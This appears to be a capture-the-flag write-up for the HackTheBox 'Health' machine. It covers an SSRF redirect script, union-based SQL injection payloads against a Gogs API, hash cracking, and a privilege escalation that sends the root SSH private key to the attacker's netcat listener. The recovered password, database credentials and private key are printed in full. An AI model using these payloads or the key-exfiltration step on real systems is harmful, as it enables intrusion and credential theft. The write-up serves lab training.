---
title: "HTB - Health"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for HTB - Health"
categories:
  - HTB
---

The given box ```Health``` is a Linux machine 

- [HackTheBox- Health](#hackthebox---Health)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
	  - [Autorecon Scan](#autorecon-scan)
 - [Enumeration](#enumeration)
	 - [Port 22](#port-22)
	 - [Port 80](#port-80)
 - [Initial Foothold](#initial-foothold)
 - [Privilege Escalation](#privilege-escalation)
 - [Conclusion](#conclusion)

<center>
<img src = "https://www.hackthebox.com/storage/avatars/a9b92307fbcfa1472607067909a2bccf.png" />
</center>


## Recon

### Nmap Scan

```shell
nmap 10.129.10.190   
Nmap scan report for 10.129.10.190
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```

## Enumeration 

Enumeration on ports!!!

### Port 22

No Vulnerability found on SSH side

### Port 80

![[Pasted image 20220823205522.png]]

#### Page source

Found these links -> http://health.htb/webhook 
							 -> http://health.htb/js/app.js

From webhook page we got to know `POST` and `GET` http methods are used for this application

#### Redirecting the response

Since the box is having port 3000 in filtered state, so we get the response from there through redirecting.

python script for redirection,

```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
```

Followed by in the web page we have to give the below values,

	Payload url -> http://10.10.16.22:4444/
	Monitored url -> http://10.10.16.22/
	Interval -> */1 * * * *
	Under what circumstances should the webhook be sent? -> Always

![[Pasted image 20220823212145.png]]

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# python3 redirect.py "http://127.0.0.1:3000/"
10.129.114.90 - - [23/Aug/2022 21:19:45] "GET / HTTP/1.0" 302 -
```

Run netcat listener on port 4444,

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# netcat -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.129.114.90] 45856
POST / HTTP/1.1
Host: 10.10.16.22:4444
Accept: */*
Content-type: application/json
Content-Length: 7663
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.16.22:4444\/","monitoredUrl":"http:\/\/10.10.16.22","health":"up","body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"PuBhWGBMPj1X03xJeHIDv7iKRZk6MTY2MTI2OTc4MDA5MzQ0ODQ2OQ==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"PuBhWGBMPj1X03xJeHIDv7iKRZk6MTY2MTI2OTc4MDA5MzQ0ODQ2OQ==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>0ms<\/strong> \u00b7\n\t\t            Template: <strong>0ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>","message":"HTTP\/1.0 302 Found","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.5","Date":"Tue, 23 Aug 2022 15:49:40 GMT","Location":"http:\/\/127.0.0.1:3000\/","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```

Formatted the above html code and run it, from there we got `Gogs - Go Git Service` 

#### Enumerating Gogs

From searchsploit we got some results,

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# searchsploit Gogs                         
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gogs - 'label' SQL Injection                                                                                                                     | multiple/webapps/35237.txt
Gogs - 'users'/'repos' '?q' SQL Injection                                                                                                        | multiple/webapps/35238.txt
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Downloaded both, got information on SSRF sql injection.

![[Pasted image 20220824220313.png]]

https://github.com/gogs/gogs/tree/v0.5.5 from github we got vulnerable file user.go in models folder were we can look possible stuffs.

With above searched exploit, performing sql injection modifying the required data based on the requirements got from user.go file,

	Id            int64
	Passwd        string `xorm:"NOT NULL"`
	Avatar        string `xorm:"VARCHAR(2048) NOT NULL"`
	AvatarEmail   string `xorm:"NOT NULL"`
	Rands         string    `xorm:"VARCHAR(10)"`
	Salt          string    `xorm:"VARCHAR(10)"`

Passwd:

```shell
python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/1,'1',(select/**/passwd/**/from/**/user),'1','1','1','1',1,'1',1,1,1,1,1,'1','1','1','1',1,1,'1','1',null,null,'1',1,1--/**/-OR/**/('1'='1"
```

Salt:

```shell
python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search
q=e')/**/union/**/all/**/select/**/1,'1',(select/**/salt/**/from/**/user),'1','1','1','1',1,'1',1,1,1,1,1,'1','1','1','1',1,1,'1','1',null,null,'1',1,1--/**/-OR/**/('1'='1"
```

Now we got encrypted password and salt, we have to decrypt from the file `user.go` a function is encoding the password

```go
// EncodePasswd encodes password to safe format.
func (u *User) EncodePasswd() {
newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
u.Passwd = fmt.Sprintf("%x", newPasswd)
}
```

	PBKDF2 -> 10900|PBKDF2-HMAC-SHA256 |sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# echo 'sha256:10000:'$(echo 'sO3XIbeW14' | base64 | cut -c1-14)':'$(echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64) | tee hash.txt
```

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# cat hash.txt 

sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
                                                                                                                                                                                   
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found in potfile! Use --show to display them.

Started: Wed Aug 24 22:43:13 2022
Stopped: Wed Aug 24 22:43:13 2022
                                                                                                                                                                                   
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --show
sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
```

### Port 3000

## Initial Foothold

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# ssh susanne@10.129.114.3
The authenticity of host '10.129.114.3 (10.129.114.3)' can't be established.
ED25519 key fingerprint is SHA256:K0WrmjTWDZhl/D/mYbJSv/cBLF1Jnx0T2auXQQDc7/Q.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:57: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.114.3' (ED25519) to the list of known hosts.
susanne@10.129.114.3's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 24 17:14:34 UTC 2022

  System load:  0.0               Processes:           171
  Usage of /:   68.3% of 3.84GB   Users logged in:     0
  Memory usage: 13%               IP address for eth0: 10.129.114.3
  Swap usage:   0%


0 updates can be applied immediately.


susanne@health:~$ ls
user.txt
```

## Privilege Escalation

Using pspy64, we learnt that there is a background task that runs the created tasks from the webapp as root.

```shell
2022/08/25 15:10:01 CMD: UID=0    PID=49291  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2022/08/25 15:10:01 CMD: UID=0    PID=49290  | /bin/bash -c sleep 5 && /root/meta/clean.sh 
2022/08/25 15:10:01 CMD: UID=0    PID=49289  | /usr/sbin/CRON -f 
2022/08/25 15:10:01 CMD: UID=0    PID=49288  | /usr/sbin/CRON -f 
2022/08/25 15:10:01 CMD: UID=0    PID=49293  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2022/08/25 15:10:01 CMD: UID=0    PID=49297  | php artisan schedule:run 
2022/08/25 15:10:01 CMD: UID=???  PID=49299  | ???
2022/08/25 15:10:01 CMD: UID=???  PID=49298  | ???
2022/08/25 15:10:06 CMD: UID=0    PID=49300  | mysql laravel --execute TRUNCATE tasks 
```

Through linpeas.sh we have found some interesting stuffs,

```shell
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 www-data www-data 978 May 17 17:17 /var/www/html/.env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:x12LE6h+TU6x4gNKZIyBOmthalsPLPLv/Bf/MJfGbzY=
APP_DEBUG=true
APP_URL=http://localhost
LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

So, in principle, we can create a new task and update the task content in the db to make it load a local file, e.g /root/.ssh/id_rsa. 

![[Pasted image 20220825211531.png]]

Instead of test now we need to give create,

```mysql
mysql> select * from tasks;
+--------------------------------------+--------------------+-----------+-------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl         | onlyError | monitoredUrl      | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------+-----------+-------------------+-------------+---------------------+---------------------+
| 402cd3ad-e68c-4ae8-b441-3398acee0d31 | http://10.10.16.3/ |         0 | http://10.10.16.3 | */1 * * * * | 2022-08-25 15:33:09 | 2022-08-25 15:33:09 |
+--------------------------------------+--------------------+-----------+-------------------+-------------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# netcat -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.176] 45748
POST / HTTP/1.1
Host: 10.10.16.3
Accept: */*
Content-type: application/json
Content-Length: 1828
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.16.3\/","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
```

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# chmod 600 id_rsa
                                                                                                                                                                                   
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/LINUX/health]
└─# ssh -i id_rsa root@10.10.11.176           
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 25 15:44:59 UTC 2022

  System load:  0.0               Processes:           183
  Usage of /:   68.2% of 3.84GB   Users logged in:     1
  Memory usage: 19%               IP address for eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@health:~# ls
meta  root.txt
```